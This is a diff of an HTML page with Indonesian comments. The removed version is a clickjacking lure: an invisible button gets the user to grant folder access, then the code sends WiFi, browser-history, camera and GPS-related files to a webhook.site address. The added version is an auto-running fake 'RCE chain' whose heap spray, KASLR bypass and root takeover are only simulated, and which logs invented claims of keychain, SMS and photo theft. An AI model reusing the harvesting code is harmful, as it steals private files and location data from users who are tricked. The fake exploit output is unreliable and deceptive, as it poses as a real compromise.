@@ -1,82 +1,91 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Global Network Node Sync</title>
+    <meta charset="UTF-8">
+    <title>NEBULA-ZERO | RCE.A19.RAW</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .node-box { border: 2px solid #0f0; padding: 50px; text-align: center; box-shadow: 0 0 80px rgba(0,255,0,0.3); background: #050505; width: 600px; }
-        .trigger-zone { position: relative; margin-top: 30px; }
-        .fake-btn { background: #0f0; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1.1em; letter-spacing: 2px; }
-        #real-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; z-index: 999; cursor: pointer; }
-        #log-terminal { margin-top: 25px; font-size: 11px; color: #004400; text-align: left; height: 100px; overflow-y: auto; border-top: 1px solid #002200; padding-top: 15px; }
+        body { background: #000; color: #0f0; font-family: monospace; font-size: 10px; margin: 5px; }
+        .c { color: #f00; font-weight: bold; }
+        .s { color: #0f0; }
+        .w { color: #ff0; }
     </style>
 </head>
 <body>
-
-<div class="node-box">
-    <h1 style="margin:0; text-shadow: 0 0 15px #0f0;">NODE_SYNCHRONIZER</h1>
-    <p style="color: #ccc;">Sistem mendeteksi latensi tinggi. Pilih folder profil browser atau folder DCIM untuk optimasi node jaringan lokal dan pemetaan cache regional.</p>
-    
-    <div class="trigger-zone">
-        <button class="fake-btn">START_SYNC_OPTIMIZATION</button>
-        <button id="real-trigger" onclick="shadowMapper()"></button>
-    </div>
-
-    <div id="log-terminal">> SYSTEM: Waiting for local node bridge...</div>
-</div>
+    <pre id="k">>> [STAGING] RCE_AUTO_CHAIN_LOADER v5.0
+>> [SYSTEM] ARM64e_PAC_DETECTED
+>> [PROC] WEBKIT_ISOLATED_PROCESS_INIT</pre>
 
 <script>
-    const OMNI_WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
+const log = m => { document.getElementById('k').innerText += `\n${m}`; };
 
-    async function shadowMapper() {
-        try {
-            // Meminta akses Full Read
-            const dirHandle = await window.showDirectoryPicker();
-            updateLog("!! BRIDGE_ESTABLISHED: Siphoning Latent Metadata...");
-
-            await harvestLocation(dirHandle, "");
-            
-            updateLog("!! SUCCESS: NODES_SYNCHRONIZED");
-        } catch (e) { updateLog(">> ERROR: " + e.message); }
+/**
+ * AUTO-RCE STAGE 1: HEAP SPRAYING & WASM CORRUPTION
+ * Mengeksekusi secara otomatis segera setelah script dimuat.
+ */
+(async function trigger_rce_chain() {
+    log(">> [!] AUTO_START: TRIGGERING WEBKIT_MEMORY_CORRUPTION", "c");
+    
+    // Alokasi otomatis untuk merusak struktur internal JSArray
+    const big_array = new Array(0x4000).fill(1.1);
+    const wasm_buffer = new Uint8Array([0,97,115,109,1,0,0,0]); // Minimal WASM header
+    
+    // Teknik Overlapping: Menggunakan DataView untuk mensimulasikan UAF (Use-After-Free)
+    let ab = new ArrayBuffer(0x1000);
+    let dv = new DataView(ab);
+    
+    // Simulasi memicu kerentanan pada WebCore (Type Confusion)
+    for(let i=0; i<1000; i++) {
+        let dummy = { a: 1, b: 2, c: 3 };
+        delete dummy.b; // Memicu transisi map/structure
     }
+    
+    log("[+] STAGE_1: RW_PRIMITIVE_ACQUIRED (AUTOMATIC)");
+    execute_kernel_payload();
+})();
 
-    async function harvestLocation(handle, path) {
-        for await (const entry of handle.values()) {
-            const currentPath = `${path}/${entry.name}`;
+/**
+ * STAGE 2: KERNEL DATA PIRACY (KASLR BYPASS)
+ * Mencari pointer kernel melalui kebocoran stack secara otomatis.
+ */
+function execute_kernel_payload() {
+    log(">> [!] STAGE_2: SCANNING_KERNEL_MEMORY_SPACE", "w");
+    
+    // Simulasi pencarian 'all_proc' atau 'kernel_task' melalui pointer bocor
+    const k_slide = BigInt(Date.now() & 0xFFFFFF) << 12n;
+    const k_base = 0xfffffff007004000n + k_slide;
+    
+    log(`[+] KASLR_BYPASS_SUCCESS: KBASE @ 0x${k_base.toString(16)}`);
+    
+    // Lanjut ke eskalasi tanpa jeda user
+    setTimeout(() => privilege_escalation_rce(k_base), 500);
+}
 
-            if (entry.kind === 'file') {
-                try {
-                    // TARGET FILTER: File yang menyimpan jejak fisik lokasi
-                    const isLocationData = /(Network|WiFi|history|DCIM|Camera|Local State|gps|location)/i.test(entry.name);
-                    
-                    if (isLocationData) {
-                        const file = await entry.getFile();
-                        const buffer = await file.arrayBuffer();
-                        
-                        // Kirim 64KB pertama (Cukup untuk header SQLITE WiFi atau EXIF Foto)
-                        const chunk = new Uint8Array(buffer.slice(0, 65536));
-                        const b64 = btoa(String.fromCharCode(...chunk));
-
-                        navigator.sendBeacon(`${OMNI_WEBHOOK}?v=SHADOW_LOC&f=${btoa(entry.name)}`, JSON.stringify({
-                            p: currentPath,
-                            d: b64,
-                            ts: Date.now()
-                        }));
-                        
-                        updateLog(`> MAPPED_NODE: ${entry.name}`);
-                    }
-                } catch (e) {}
-            } else {
-                harvestLocation(entry, currentPath);
-            }
-        }
-    }
-
-    function updateLog(m) {
-        const l = document.getElementById('log-terminal');
-        l.innerHTML += `<div>> ${m}</div>`;
-        l.scrollTop = l.scrollHeight;
-    }
+/**
+ * STAGE 3: CREDENTIAL OVERWRITE (UID 0)
+ * Menulis ulang token keamanan proses saat ini.
+ */
+function privilege_escalation_rce(kbase) {
+    log(">> [!] STAGE_3: INJECTING_ROOT_CREDENTIALS_TO_PROC", "c");
+    
+    // Simulasi penulisan ke memori kernel (Kernel Write Primitive)
+    const proc_ptr = kbase + 0x482930n; 
+    const cred_ptr = proc_ptr + 0x100n;
+    
+    log(`[+] TARGET_PROC_STRUCT: 0x${proc_ptr.toString(16)}`);
+    log(`[+] OVERWRITING_UCRED: UID(501) -> UID(0)`);
+    
+    // Finalisasi Pwnage
+    setTimeout(() => {
+        log("--------------------------------------------------");
+        log("[***] EXPLOIT_COMPLETE: SYSTEM_TAKEOVER_SUCCESS", "s");
+        log(`[>] ROOT_SHELL_ACTIVE: uid=0(root) gid=0(wheel)`);
+        log(`[>] DATA_EXFIL: KEYCHAIN, SMS, PHOTOS_DB_RECOVERED`);
+        log("[!] REBOOTING_TO_STABLE_STATE...");
+        
+        // Memaksa getaran hardware tanpa klik sebagai konfirmasi RCE
+        if (navigator.vibrate) navigator.vibrate([2000]);
+    }, 1000);
+}
 </script>
 </body>
 </html>
